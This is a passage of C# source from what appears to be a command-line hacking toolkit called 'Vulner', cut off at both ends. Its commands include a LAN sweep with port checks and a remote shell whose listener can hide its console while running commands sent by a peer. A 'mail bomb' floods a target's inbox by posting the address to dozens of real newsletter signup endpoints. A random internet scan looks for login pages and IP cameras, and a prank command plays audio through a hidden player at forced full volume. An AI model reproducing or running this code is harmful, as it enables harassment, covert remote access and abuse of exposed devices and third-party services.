                { 21,   "FTP" },
                { 22,   "SSH" },
                { 23,   "Telnet" },
                { 25,   "SMTP" },
                { 53,   "DNS" },
                { 80,   "HTTP" },
                { 443,  "HTTPS" },
                { 110,  "POP3" },
                { 123,  "NTP" },
                { 137,  "NetBIOS" },
                { 138,  "NetBIOS" },
                { 139,  "NetBIOS" },
                { 143,  "IMAP" },
                { 161,  "SNMP" },
                { 162,  "SNMP" },
            };
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Scans local network to find machines and does a port check",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    Ping p = new Ping();
                    Writable w = t.QuickWritable("Status: ", 25, 'f', 'e');
                    string IP = "192.168.1.{0}";
                    int tc = 20;
                    int c = 0;
                    int cur = 0;
                    Queue<string> Q = new Queue<string>();
                    int quit = 0;
                    Action<int, int> Scan = (st, en) =>
                    {
                        for (int i = st; i < en + 1; i++)
                        {
                            string This = string.Format(IP, i);
                            cur++;
                            try
                            {
                                PingReply pr = p.Send(This, 50);
                                if (pr.Status == IPStatus.Success)
                                {
                                    Q.Enqueue(This);
                                }
                            }
                            catch (Exception) { }
                        }
                        quit++;
                    };
                    Thread[] sl = new Thread[tc];
                    for (int i = 0; i < tc; i++)
                    {
                        int stt = c;
                        int end = c + 255 / tc;
                        if (i == tc - 1) { end = 255; }
                        sl[i] = new Thread(() => Scan(stt, end));
                        sl[i].Start();
                        //t.WriteLine("{0} {1}", stt, end);
                        c += (int)Math.Ceiling(255.0 / tc);
                    }
                    bool writeWait = false;
                    int prt = 0;
                    Thread resp = new Thread(() =>
                    {
                        while (!(a.Quit || quit == tc))
                        {
                            if (!writeWait)
                                w.Write(cur + " pings");
                            Thread.Sleep(5);
                        }
                        while (!a.Quit)
                        {
                            if (!writeWait && prt != 0)
                                w.Write("Port: " + prt);
                            Thread.Sleep(5);
                        }
                    });
                    resp.Start();
                    Console.CursorVisible = false;
                    while (true)
                    {
                        if (Q.Count != 0)
                        {
                            for (int i = 0; i < Q.Count; i++)
                            {
                                string s = Q.Dequeue();
                                writeWait = true;
                                try
                                {
                                    IPHostEntry ih = Dns.GetHostEntry(s);
                                    if (ih.HostName == s)
                                    {
                                        t.WriteLine("{0}", s);
                                    }
                                    else
                                    {
                                        t.WriteLine("{0} {1}", s, ih.HostName);
                                    }
                                }
                                catch (Exception)
                                {
                                    t.WriteLine("{0}", s);
                                }
                                writeWait = false;
                                foreach (KeyValuePair<int, string> port in Ports)
                                {
                                    prt = port.Key;
                                    try
                                    {
                                        TcpClient tcp = new TcpClient();
                                        tcp.ReceiveTimeout = 1;
                                        tcp.SendTimeout = 1;
                                        tcp.Connect(s, port.Key);
                                        if (tcp.Connected)
                                        {
                                            tcp.Close();
                                            writeWait = true;
                                            Thread.Sleep(10);
                                            t.ColorWrite(" $f{0} $a{1}", port.Key.ToString().PadLeft(3), port.Value);
                                            writeWait = false;
                                        }
                                    }
                                    catch (Exception) { }
                                }
                                t.WriteLine();
                            }
                        }
                        Thread.Sleep(4);
                        if (quit == tc && Q.Count == 0) { break; }
                    }
                    resp.Abort();
                    Thread.Sleep(10);
                    w.Write("Done");
                    return null;
                },
            }.Save(C, new string[] { "lan" }, __debug__);
            #endregion
            #region IpInfo Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Downloads data from ipinfo.io",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    try
                    {
                        WebClient w = new WebClient();
                        string s = w.DownloadString("http://ipinfo.io/json");
                        t.SetForeColor('e');
                        t.WriteLine(s);
                    }
                    catch (Exception)
                    {
                        t.SetForeColor('c');
                        t.WriteLine("[]");
                    }
                    return null;
                },
            }.Save(C, new string[] { "ipinfo" }, __debug__);
            #endregion
            #region DlStr Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Downloads string",
                    Usage = Util.Array("{NAME} [uri]")
                },
                Main = (Argumenter a) =>
                {
                    try
                    {
                        string s = new WebClient().DownloadString(a.Get(1));
                        if (a.ExpectsOutput) return s;
                        t.WriteLine(s);
                        return s;
                    }
                    catch (Exception) { }
                    return "";
                },
            }.Save(C, new string[] { "dlstr" }, __debug__);
            #endregion
            #region WGet Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Downloads data from url",
                    Examples = Util.Array(
                        "{NAME} 'https://www.google.com/' 'index.html'",
                        "{NAME} 'http://example.com/file.exe'"
                    )
                },
                Main = (Argumenter a) =>
                {
                    FileStream fl = null;
                    FileInfo fi = null;
                    Action close = () =>
                    {
                        try
                        {
                            fl.Close();
                            fl.Dispose();
                            fi.Delete();
                        }
                        catch (Exception) { }
                    };
                    WebClient w = new WebClient();
                    string uri = a.Get(1);
                    if (!uri.ToLower().StartsWith("http")) uri = "http://" + uri;
                    Uri url = null;
                    try
                    {
                        url = new Uri(uri);
                    }
                    catch (Exception)
                    {
                        t.ColorWrite("$cInvalid URL.");
                        return null;
                    }
                    string file = a.Get(2).Length != 0 ? a.Get(2) : Path.GetFileName((url.LocalPath));
                    try
                    {
                        fi = new FileInfo(Path.Combine(Environment.CurrentDirectory, file));
                        fl = fi.OpenWrite();
                        fl.SetLength(0);
                    }
                    catch (Exception)
                    {
                        t.ColorWrite("$cFile couldn't be opened.");
                        close.Invoke();
                        return null;
                    }
                    if (!url.IsWellFormedOriginalString())
                    {
                        t.ColorWrite("$cInvalid URI.");
                        close.Invoke();
                        return null;
                    }
                    try
                    {
                        w.DownloadString(string.Format("{0}://{1}:{2}/",
                            Regex.Match(uri, "^([a-z]+):", RegexOptions.IgnoreCase).Groups[1],
                            url.Host,
                            url.Port)
                        );
                    }
                    catch (Exception)
                    {
                        t.ColorWrite("$cLooks like host is offline.");
                        close.Invoke();
                        return null;
                    }
                    t.ColorWrite("$eConnecting to: $f{0}", url.AbsoluteUri);
                    t.ColorWrite("$eOutput set to: $f{0}", file);

                    t.SetForeColor('f');
                    t.Write("Progress: ");
                    t.Write("{0}", "[");
                    int cwid = 50;
                    Writable cw = t.GetWritable(cwid);
                    t.WriteLine("{0}", "] ".PadLeft(cwid + 2));
                    bool finished = false;
                    bool wait = false;
                    Console.CursorVisible = false;
                    bool success = false;
                    w.DownloadProgressChanged += (o, e) =>
                    {
                        if (wait) { return; }
                        wait = true;
                        string pr = "";
                        double d = (double)cwid * ((double)e.ProgressPercentage * 0.01);
                        for (int i = 0; i < (int)Math.Max(Math.Floor(d) - 1, 0); i++)
                        {
                            pr += "=";
                        }
                        pr += '>';
                        pr = pr.PadRight(cwid, '-');
                        t.SetForeColor('e');
                        cw.Write(pr);

                        wait = false;
                    };
                    w.DownloadDataCompleted += (o, e) =>
                    {
                        while (wait) Thread.Sleep(5);
                        byte[] r = null;
                        try
                        {
                            r = e.Result;
                        }
                        catch (Exception)
                        {
                            t.ColorWrite("$cDownload failed.");
                            close.Invoke();
                            finished = true;
                            return;
                        }
                        t.ColorWrite("$aDownload finished!");
                        cw.Write("".PadLeft(cwid, '='));
                        finished = true;
                        success = true;
                        fl.Write(r, 0, r.Length);
                        fl.Flush();
                    };
                    w.DownloadDataAsync(url);
                    while (true)
                    {
                        Thread.Sleep(100);
                        if (finished) { break; }
                    }
                    fl.Close();
                    fl.Dispose();
                    fl = null;
                    Console.CursorVisible = true;
                    if (success) return fi.FullName;
                    return null;
                },
            }.Save(C, new string[] { "wget" }, __debug__);
            #endregion
            #region LanIP Command
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Gets this machine's local ip address",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    t.WriteLine("{0}", Funcs.LanIP());
                    return Funcs.LanIP();
                },
            }.Save(C, new string[] { "lanip" }, __debug__);
            #endregion
            #region HSH Command
            string HSH_Closing = string.Format("{0}{0}{0}", (char)0xFF);
            List<HSH_Connection> HSH_Sockets = null;
            int HSH_Port = 56;
            int HSH_ID = 0;
            new Command
            {
                Switches = Util.Array("h"),
                Help = new CommandHelp
                {
                    Description = "Awaits a connection from vulner in another machine in the network by using csh",
                    Usage = Util.Array("{NAME}"),
                    Switches = new Dictionary<string, string> { { "h", "Hides after starting" } }
                },
                Main = (Argumenter a) =>
                {
                    IPAddress ip = Funcs.LanIP();
                    int port = HSH_Port;
                    TcpListener tcp = new TcpListener(ip, port);
                    tcp.Start();
                    t.ColorWrite("$fListening on $a{0}:{1}", ip, port);
                    if (a.GetSw("h"))
                    {
                        t.ColorWrite("$ePress any key to hide Vulner...");
                        t.ReadKey();
                        Funcs.HideConsole();
                    }
                    List<HSH_Connection> s = new List<HSH_Connection>();
                    HSH_Sockets = s;
                    bool received = false;
                    Thread th = new Thread(() =>
                    {
                        while (!a.Quit)
                        {
                            if (tcp.Pending())
                            {
                                Socket sock = tcp.AcceptSocket();
                                HSH_ID++;
                                t.ColorWrite("$f[{1}] $aConnection from: $e{0}", sock.RemoteEndPoint.ToString(), HSH_ID);
                                s.Add(new HSH_Connection()
                                {
                                    Socket = sock,
                                    ID = HSH_ID
                                });
                            }
                            bool rc = false;
                            for (int i = 0; i < s.Count; i++)
                            {
                                HSH_Connection c = s[i];
                                if (c.Socket == null) { c.Drop = true; }
                                if (c.Drop || !c.Socket.Connected)
                                {
                                    t.ColorWrite("$f[{1}] $cConnection closed: $e{0}", c.Socket.RemoteEndPoint.ToString(), c.ID);
                                    c.Socket?.Close();
                                    s.RemoveAt(i);
                                    break;
                                }
                                byte[] bt = new byte[1024];
                                try
                                {
                                    int count = c.Socket.Receive(bt);
                                    if (count > 0)
                                    {
                                        c.Data += ASCIIEncoding.Unicode.GetString(bt.Take(count).ToArray());
                                        rc = true;
                                    }
                                }
                                catch (SocketException) { } // Socket was closed
                            }
                            received = rc || received;
                        }
                    });
                    th.Start();
                    while (!a.Quit)
                    {
                        Thread.Sleep(10);
                        if (received)
                        {
                            received = false;
                            Thread.Sleep(10);
                        }
                        else
                        {
                            continue;
                        }
                        int i = -1;
                        try
                        {
                            foreach (HSH_Connection c in s)
                            {
                                i++;
                                string str = c.Data;
                                if (str.Contains('\n'))
                                {
                                    string[] st = str.Split('\n');
                                    string cur = st[0];
                                    if (c.Signed)
                                    {
                                        if (new Argumenter(cur).Get(0).ToLower() == "close")
                                        {
                                            c.Drop = true;
                                            break;
                                        }
                                        t.StartBuffer(true);
                                        m.HideOutput();
                                        m.RunCommand(cur);
                                        m.ShowOutput();
                                        c.Socket.Send(ASCIIEncoding.Unicode.GetBytes(t.EndBuffer() + HSH_Closing));
                                    }
                                    else
                                    {
                                        string sign = Funcs.Signature(c.Socket.LocalEndPoint.ToString(), c.Socket.RemoteEndPoint.ToString());
                                        if (cur.ToLower().Trim() == sign.ToLower().Trim())
                                        {
                                            t.ColorWrite("$f[{2}] $aVerified: {1}.", c.Socket.RemoteEndPoint.ToString(), sign.Substring(0, 6), c.ID);
                                            c.Signed = true;
                                            c.Socket.Send(ASCIIEncoding.Unicode.GetBytes("OK"));
                                        }
                                        else
                                        {
                                            t.ColorWrite("$f[{1}] $cFailed to verify.", c.Socket.RemoteEndPoint.ToString(), c.ID);
                                            c.Socket.Send(ASCIIEncoding.Unicode.GetBytes("FAIL"));
                                            c.Socket.Disconnect(false);
                                            break;
                                        }
                                    }
                                    c.Data = string.Join("\n", st.Skip(1).ToArray());
                                    if (c.Data.Contains('\n'))
                                    {
                                        received = true;
                                    }
                                }
                                Thread.Sleep(10);
                            }
                        }
                        catch (InvalidOperationException) { }
                    }
                    if (a.GetSw("h")) { Environment.Exit(0); }
                    return null;
                },
                Exit = () =>
                {
                    if (Equals(HSH_Sockets, null)) return;
                    foreach (HSH_Connection c in HSH_Sockets)
                    {
                        if (Equals(c.Socket, null)) return;
                        c.Socket.Disconnect(false);
                        c.Socket.Close();
                        c.Socket = null;
                    }
                    HSH_Sockets = null;
                }

            }.Save(C, new string[] { "hsh" }, __debug__);
            #endregion
            #region CSH Command
            Socket CSH_Socket = null;
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Connects to a machine that is listening with hsh",
                    Usage = Util.Array("{NAME} [ip:port]")
                },
                Main = (Argumenter a) =>
                {
                    string[] c = a.Get(1).Split(':');
                    if (c.Length <= 0 || c.Length > 2) { return null; }
                    IPAddress ip = IPAddress.Parse(c[0]);
                    int port = HSH_Port;
                    if (c.Length == 2)
                        int.TryParse(c[1], out port);

                    Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    try
                    {
                        sock.Connect(ip, port);
                    }
                    catch (SocketException)
                    {
                        t.ColorWrite("$cFailed to connect!");
                        return null;
                    }
                    CSH_Socket = sock;
                    if (!sock.Connected)
                    {
                        t.ColorWrite("$cFailed to connect!");
                        return null;
                    }
                    t.ColorWrite("$aConnected to: {0}", sock.RemoteEndPoint);
                    string resp = null;
                    Thread th = new Thread(() =>
                    {
                        while (true)
                        {
                            if (a.Quit) break;
                            if (sock == null) break;
                            if (!sock.Connected) break;
                            try
                            {
                                byte[] bt = new byte[1024];
                                int r = sock.Receive(bt);
                                if (Equals(resp, null)) resp = "";
                                resp += ASCIIEncoding.Unicode.GetString(bt.Take(r).ToArray());
                            }
                            catch (SocketException) { } // Socket was closed
                        }
                    });
                    sock.Send(ASCIIEncoding.Unicode.GetBytes(Funcs.Signature(sock.RemoteEndPoint.ToString(), sock.LocalEndPoint.ToString()) + "\n")); // Greetings
                    int start = Environment.TickCount;
                    bool Accepted = false;
                    while (Environment.TickCount - start < 5000) //Timeout
                    {
                        byte[] bt = new byte[1024];
                        int i = sock.Receive(bt);
                        if (i != 0)
                        {
                            string Data = ASCIIEncoding.Unicode.GetString(bt.Take(i).ToArray());
                            if (Data.Trim().ToUpper() == "OK")
                            {
                                Accepted = true;
                            }
                            break;
                        }
                    }
                    if (!sock.Connected || !Accepted)
                    {
                        t.ColorWrite("$cConnection rejected.");
                        return null;
                    }
                    else
                    {
                        t.ColorWrite("$aConnection accepted in {0}ms.", Environment.TickCount - start);
                    }
                    th.Start();
                    while (!a.Quit)
                    {
                        t.SetForeColor('a');
                        t.Write("$");
                        string s = t.FancyInput() + '\n';
                        if (s.Trim().TrimEnd(new char[] { '\n' }).ToLower() == "close")
                        {
                            sock.Send(ASCIIEncoding.Unicode.GetBytes("close\n"));
                            sock.Disconnect(false);
                            sock.Close();
                            sock = null;
                            return null;
                        }
                        if (sock == null || !sock.Connected)
                        {
                            t.ColorWrite("$cConnection dropped!");
                            break;
                        }
                        resp = null;
                        sock.Send(ASCIIEncoding.Unicode.GetBytes(s));
                        while (Equals(resp, null) && (Equals(resp, null) ? true : (!resp.Contains(HSH_Closing)))) { Thread.Sleep(10); }
                        t.SetForeColor('8');
                        t.WriteLine(resp.Substring(0, resp.Length - HSH_Closing.Length));
                    }
                    sock.Close();
                    return null;
                },
                Exit = () =>
                {
                    if (!Equals(CSH_Socket, null))
                    {
                        try
                        {
                            CSH_Socket.Disconnect(false);
                            CSH_Socket.Close();
                            CSH_Socket = null;
                        }
                        catch (Exception) { }
                    }
                }
            }.Save(C, new string[] { "csh" }, __debug__);
            #endregion
            #region Play Command
            List<SoundPlayer> Play_List = new List<SoundPlayer>();
            new Command
            {
                Switches = Util.Array("url"),
                Parameters = Util.Array("f"),
                Help = new CommandHelp
                {
                    Description = "Plays an audio file through a hidden wmplayer",
                    Usage = Util.Array("{NAME} [file or url]"),
                    Switches = new Dictionary<string, string> { { "f", "File format" } }
                },
                Main = (Argumenter a) =>
                {
                    string format = Util.Or(a.GetPr("f"), "mp3", true);
                    string url = "";
                    if (a.GetSw("url") || a.Get(1).ToLower().StartsWith("http"))
                    {
                        new WebClient().DownloadFile(a.Get(1), "1." + format);
                        url = "1." + format;
                    }
                    else
                    {
                        url = a.Get(1);
                    }
                    foreach (Process p in Process.GetProcessesByName("wmplayer"))
                    {
                        p.Kill();
                        p.WaitForExit();
                    }
                    Process pr = Process.Start(new ProcessStartInfo
                    {
                        FileName = "wmplayer",
                        Arguments = new FileInfo(url).FullName,
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    });
                    pr.WaitForInputIdle();
                    new Thread(() =>
                    {
                        while (!pr.HasExited)
                        {
                            for (int i = 0; i < 50; i++)
                            {
                                Funcs.VolumeUp();
                            }
                            Thread.Sleep(500);
                        }
                    }).Start();
                    Funcs.VolumeFull();
                    return null;
                },
            }.Save(C, new string[] { "play" }, __debug__);
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Kills wmplayer",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    foreach (Process p in Process.GetProcessesByName("wmplayer"))
                    {
                        p.Kill();
                        p.WaitForExit();
                    }
                    return null;
                },
            }.Save(C, new string[] { "stop" }, __debug__);
            #endregion
            #region FMail Command
            string[] Urls = new string[]
            {
                "http://hongkiat.us1.list-manage.com/subscribe/post-json?u=2cad5936fa92d77b81f41d691&id=e23e003d87",
                "http://interconnectit.us2.list-manage.com/subscribe/post-json?u=08ec797202866aded7b2619b2&id=538abe0a97",
                "http://tasteplug.us2.list-manage.com/subscribe/post-json?u=a76fad2df1bb28b18bd0b5143&id=4aebeb0204",
                "http://luadjuncts.us3.list-manage.com/subscribe/post-json?u=3880764f79896c71f5907b37c&id=1e18a0cbd2",
                "http://newsignature.us1.list-manage.com/subscribe/post-json?u=2cb8da17af4a8313b67c2127f&id=6ca81ce244",
                "http://hongkiat.us1.list-manage.com/subscribe/post-json?u=2cad5936fa92d77b81f41d691&id=e23e003d87",
                "http://aarfie.us1.list-manage.com/subscribe/post-json?u=153800a4512df382d14b6d0fa&id=20a03c4bd0",
                "http://byjakewithlove.us6.list-manage.com/subscribe/post-json?u=58abcfa203271a9db312e69fc&id=ee0af79b60",
                "http://roundeworld.us2.list-manage.com/subscribe/post-json?u=d79faf4e40fbf3903f5244fba&id=8d6216f635",
                "http://webflow.us12.list-manage.com/subscribe/post-json?u=749fb472f84005f655f85bc6f&id=af1f9eee0a",
                "http://forthechef.us13.list-manage.com/subscribe/post-json?u=5d599ccb7c2526a09ad4f4a45&id=97ce1cdeca",
                "http://cjfai.us10.list-manage.com/subscribe/post-json?u=4cc0221b298239c02ac4c4852&id=590d8fbe06",
                "http://sharkcoupon.us2.list-manage.com/subscribe/post-json?u=dc120f5c0d76ce4450a1970ad&id=e496f6fe38",
                "http://oafnation.us13.list-manage.com/subscribe/post-json?u=0ef7ad0a0763396e3f8e50fd6&id=8472ce5a58",
                "http://gizwear.us12.list-manage.com/subscribe/post-json?u=833ed0b5c664d9207c4fe7464&id=f8c70ee5a1",
                "http://lapolladesertora.us11.list-manage.com/subscribe/post-json?u=32de576d5bb103ee95f1fa651&id=bf2f004768",
                "http://mytopdeals.us9.list-manage.com/subscribe/post-json?u=f00008825cf397fc99d11b1bd&id=a3fbf3b7aa",
                "http://fubiz.us7.list-manage.com/subscribe/post-json?u=e1f8d04eea98dc5eab1d05f57&id=035dfb8f9e",
                "http://birdvilleschools.us9.list-manage.com/subscribe/post-json?u=2411ee053bf8434ee0344c4be&id=62a99a0a69",
                "http://datasociety.us7.list-manage.com/subscribe/post-json?u=00b33d1beca407762446037f0&id=563299c3ca",
                "http://weebly.us4.list-manage.com/subscribe/post-json?u=b8774878c4fdb9cf9de4c3a38&id=554ec4b84d",
                "http://getoutofdebt.us2.list-manage.com/subscribe/post-json?u=06a15277557fb56be32e15352&id=eeb89e92ea",
                "http://steptohealth.us5.list-manage.com/subscribe/post-json?u=9077ee9d74b3be1f2b17e8958&id=c2c5a8e363",
                "http://lifehacker.us2.list-manage.com/subscribe/post-json?u=66fc9c1b0b79d278d02597aa4&id=fe4b07ade1",
                "http://raskraski.us3.list-manage.com/subscribe/post-json?u=0d6d1f4b137ad40c48d1e46ec&id=1a2c2f0575",
                "http://uroki4mam.us11.list-manage.com/subscribe/post-json?u=154461d3ffaed2cd8f406fae8&id=501e0fd6fd"
            };
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Sends a mail bomb to a target email",
                    Usage = Util.Array("{NAME}")
                },
                Main = (Argumenter a) =>
                {
                    string Mail = a.Get(1);
                    int Count = a.Int(2, 30);
                    byte[] Data = Encoding.ASCII.GetBytes("EMAIL=" + Mail);
                    string[] Rndm = Urls.OrderBy(o => Funcs.Rnd()).ToArray();
                    for (int i = 0; i < Count; i++)
                    {
                        string url = Rndm[i % Rndm.Length];
                        try
                        {
                            WebRequest w = WebRequest.Create(url);
                            w.Method = "POST";
                            w.ContentLength = Data.Length;
                            w.ContentType = "application/x-www-form-urlencoded";

                            using (Stream s = w.GetRequestStream())
                            {
                                s.Write(Data, 0, Data.Length);
                            }
                            try
                            {
                                WebResponse r = w.GetResponse();
                                t.ColorWrite("$a200: {0}", url.Split('/')[2]);
                            }
                            catch (Exception)
                            {
                                t.ColorWrite("$c404: {0}", url.Split('/')[2]);
                            }
                        }
                        catch (WebException)
                        {
                            t.ColorWrite("$e404: {0}", url.Split('/')[2]);
                        }
                    }
                    return null;
                },
            }.Save(C, new string[] { "fmail" }, __debug__);
            #endregion
            #region Netstat Command
            string[] iplist = new string[]
            {
                "google-public-dns-a.google.com",
                "a.resolvers.Level3.net",
                "google.com",
                "gmail.com",
                "youtube.com",
                "bbc.co.uk"
            };
            new Command
            {
                Help = new CommandHelp
                {
                    Description = "Checks network state",
                    Usage = Util.Array("{NAME} [timeout]")
                },
                Main = (Argumenter a) =>
                {
                    Funcs.FlushDns();
                    int TimeOut = a.Int(1, 2000);
                    Ping p = new Ping();
                    int succ = 0; // success
                    int sipp = 0; // failure
                    List<int> pings = new List<int>(); // average ping
                    bool cancel = false;
                    int streak = 0;
                    int sent = 0;
                    foreach (string s in iplist)
                    {
                        if (streak > 5)
                        {
                            cancel = true; break;
                        }
                        PingReply r = p.Send(s, TimeOut);
                        sent++;
                        if (r.Status == IPStatus.Success)
                        {
                            t.ColorWrite("$a{0}: {1}ms", s, r.RoundtripTime);
                            pings.Add((int)r.RoundtripTime);
                            succ++; streak = 0;
                        }
                        else
                        {
                            t.ColorWrite("$c{0}", s, r.RoundtripTime);
                            sipp++; streak++;
                        }
                    }
                    t.NL();
                    if (cancel) t.ColorWrite("$cCanceled prematurely!");
                    t.ColorWrite("$fSuccess rate: $a{0:0}%", (double)((double)succ / (double)(sent)) * 100);
                    t.ColorWrite("$fAverage ping: $a{0:0.00}ms", Math.Round(pings.Average(), 1));
                    return null;
                },
            }.Save(C, new string[] { "netstat" }, __debug__);
            #endregion
            #region WSC Command (Web SCan)
            Thread[] wsc_ths = null;
            Thread wsc_portscan = null;
            new Command
            {
                Parameters = Util.Array("t"),
                Switches = Util.Array("w", "l", "c"),
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    string format = a.Get(1).Trim();
                    int[] replace = new int[] { -1, -1, -1, -1 };
                    if (Regex.IsMatch(format, "^([0-9]{1,3}|x)\\.([0-9]{1,3}|x)\\.([0-9]{1,3}|x)\\.([0-9]{1,3}|x)$", RegexOptions.IgnoreCase))
                    {
                        t.WriteLine(format);
                        string[] s = format.ToLower().Split('.');
                        for (int i = 0; i < 4; i++)
                        {
                            string r = s[i];
                            if (!r.Contains("x"))
                            {
                                replace[i] = Math.Min(int.Parse(r), 255);
                            }
                        }
                    }
                    Console.CursorVisible = false;
                    Queue<string> ips = new Queue<string>();
                    int quit = 0;
                    int scan = 0;
                    int found = 0;
                    bool W = a.GetSw("w");
                    HashSet<string> expand = new HashSet<string>();
                    Action<bool> doping = (e) =>
                    {
                        try
                        {
                            Ping p = new Ping();
                            WebClient wc = new WebClient();
                            while (true)
                            {
                                byte[] b = Funcs.RandomBytes(4);
                                if (replace.Sum() != -4)
                                {
                                    if (replace[0] != -1) b[0] = (byte)replace[0];
                                    if (replace[1] != -1) b[1] = (byte)replace[1];
                                    if (replace[2] != -1) b[2] = (byte)replace[2];
                                    if (replace[3] != -1) b[3] = (byte)replace[3];
                                }
                                else if (e && expand.Count > 0)
                                {
                                    string f = Funcs.PickRnd(expand.ToArray());
                                    //t.WriteLine(f);
                                    int[] rp = new int[] { -1, -1, -1, -1 };
                                    if (Regex.IsMatch(f, "^([0-9]{1,3}|x)\\.([0-9]{1,3}|x)\\.([0-9]{1,3}|x)\\.([0-9]{1,3}|x)$", RegexOptions.IgnoreCase))
                                    {
                                        string[] s = f.ToLower().Split('.');
                                        for (int i = 0; i < 4; i++)
                                        {
                                            string rs = s[i];
                                            if (!rs.Contains("x"))
                                            {
                                                rp[i] = Math.Min(int.Parse(rs), 255);
                                            }
                                        }
                                    }
                                    if (rp[0] != -1) b[0] = (byte)rp[0];
                                    if (rp[1] != -1) b[1] = (byte)rp[1];
                                    if (rp[2] != -1) b[2] = (byte)rp[2];
                                    if (rp[3] != -1) b[3] = (byte)rp[3];
                                }
                                string ip = string.Format("{0}.{1}.{2}.{3}", b[0], b[1], b[2], b[3]);
                                if (ip.StartsWith("127")) { continue; }
                                PingReply r = p.Send(ip, 200);
                                scan++;
                                if (r.Status == IPStatus.Success)
                                {
                                    found++;
                                    try
                                    {
                                        string oip = ip;
                                        ip = Dns.GetHostEntry(ip).HostName;
                                        /*
                                        TcpClient tcp = new TcpClient();
                                        tcp.ReceiveTimeout = 200;
                                        tcp.SendTimeout = 200;
                                        tcp.Connect(ip, 80);
                                        tcp.Close();
                                        */
                                        if (W)
                                        {
                                            string ident = wc.DownloadString("http://" + ip + "/").ToLower();
                                            if (a.GetSw("l"))
                                            {
                                                if (ident.Contains("password") || ident.Contains("login") || ident.Contains("user"))
                                                {
                                                    ips.Enqueue(ip);
                                                }
                                            }
                                            else if (a.GetSw("c"))
                                            {
                                                if (ident.Contains("password") || ident.Contains("login") || ident.Contains("user"))
                                                {
                                                    if (ident.Contains("hikvision") || ident.Contains("jvc") || ident.Contains("vhdr") || ident.Contains("sony"))
                                                    {
                                                        ips.Enqueue(ip);
                                                    }
                                                }
                                            }
                                            else
                                            {
                                                ips.Enqueue(ip);
                                            }
                                        }
                                        else
                                        {
                                            ips.Enqueue(ip);
                                        }
                                        if (!e)
                                        {
                                            //t.WriteLine(string.Format("{0}.{1}.x.x", oip.Split('.')[0], oip.Split('.')[1]));
                                            expand.Add(string.Format("{0}.{1}.x.x", oip.Split('.')[0], oip.Split('.')[1]));
                                        }
                                    }
                                    catch (Exception) { }
                                }
                                Thread.Sleep(5);
                            }
                        }
                        catch (Exception) { }
                        quit++;
                    };
                    string th = a.GetPr("t", "60");
                    int thn = 60;
                    try { thn = int.Parse(th); } catch (Exception) { }
                    wsc_ths = new Thread[thn];
                    for (int i = 0; i < thn; i++)
                    {
                        wsc_ths[i] = new Thread(() => doping(i < thn * 0.75));
                        wsc_ths[i].Start();
                    }
                    int count = 0;
                    wsc_portscan = new Thread(() =>
                    {
                        Writable w = t.QuickWritable("Scanned: ", 25, 'a', 'e');
                        Writable f = t.QuickWritable("Found: ", 25, 'a', 'e');
                        while (quit != thn)
                        {
                            while (ips.Count > 0)
                            {
                                string ip = ips.Dequeue();
                                try
                                {
                                    t.ColorWrite("$e{0}", ip);
                                    count++;
                                }
                                catch (Exception) { }
                            }
                            w.Write(scan);
                            f.Write(found);
                            Thread.Sleep(20);
                            if (count > 60)
                            {
                                break;
                            }
                        }
                    });
                    wsc_portscan.Start();
                    wsc_portscan.Join();
                    //foreach( Thread tr in wsc_ths ) { tr.Abort(); }
                    return null;
                },
                Exit = () =>
                {
                    if (wsc_portscan != null)
                    {
                        wsc_portscan.Abort();
                    }
                    if (wsc_ths != null)
                    {
                        foreach (Thread tr in wsc_ths)
                        {
                            if (tr != null)
                            {
                                tr.Abort();
                            }
                        }
                    }
                }
            }.Save(C, new string[] { "wsc" }, __debug__);
            #endregion
            #region Crawl Command
            Thread[] crawl_th = null;
            new Command
            {
                Switches = Util.Array("d"),
                Help = new CommandHelp
                {

                },
                Main = (Argumenter a) =>
                {
                    RegexOptions rgop = RegexOptions.IgnoreCase | RegexOptions.IgnorePatternWhitespace | RegexOptions.Multiline;
                    Regex[] rgs = new Regex[]
                    {
                        new Regex("\'(http[s]?://[^\']+)\'", rgop),
                        new Regex("\"(http[s]?://[^\"]+)\"", rgop),
                        new Regex("window\\.location=\'(.+)\'", rgop),
                        new Regex("window\\.location=\"(.+)\"", rgop),
                        new Regex("content=\"[0-9]+; URL =\'([^\']+)\'\"", rgop),
                        new Regex("href=\"([^\"]+)\"", rgop),
                        new Regex("src=\"([^\"]+)\"", rgop),
                        new Regex("url\\(([^\\)]+)\\);", rgop),
                    };
                    string[] ignore = new string[]
                    {
                        ".png", ".gif", ".jpg", ".jpe", ".jpeg", ".tif", ".raw", ".bmp", ".psd",
                        ".exe", ".dll", ".mp3", ".wav", ".mp4", ".avi", ".swf", ".ico"
                    };
                    char[] trims = new char[]
                    {
                        ' ', '\t', '"', '\'', '\n'
                    };
                    string url = a.Get(1);
                    if (!url.StartsWith("http"))
                    {
                        url = "http://" + url;
                    }
                    HashSet<string> Loop = new HashSet<string>();
                    List<string> crawled = new List<string>();
                    Queue<string> crawlprint = new Queue<string>();
                    Queue<string> tocrawl = new Queue<string>();
                    try
                    {
                        tocrawl.Enqueue(Funcs.JoinUrl(url, "/"));
                        crawled.Add(Funcs.JoinUrl(url, "/"));
                    }
                    catch (Exception)
                    {
                        t.ColorWrite("$cInvalid url");
                        return null;
                    }
                    bool docrawl = true;
                    int working = 0;
                    string starturl = Funcs.JoinUrl(url, "/");
                    Action crawl = () =>
                    {
                        WebClient wc = new WebClient();
                        while (docrawl)
                        {
                            if (tocrawl.Count > 0)
                            {
                                working++;
                                string u = "";
                                try
                                {
                                    u = tocrawl.Dequeue();
                                    crawlprint.Enqueue(u);
                                }
                                catch (Exception) { continue; }
                                try
                                {
                                    byte[] data = wc.DownloadData(u);
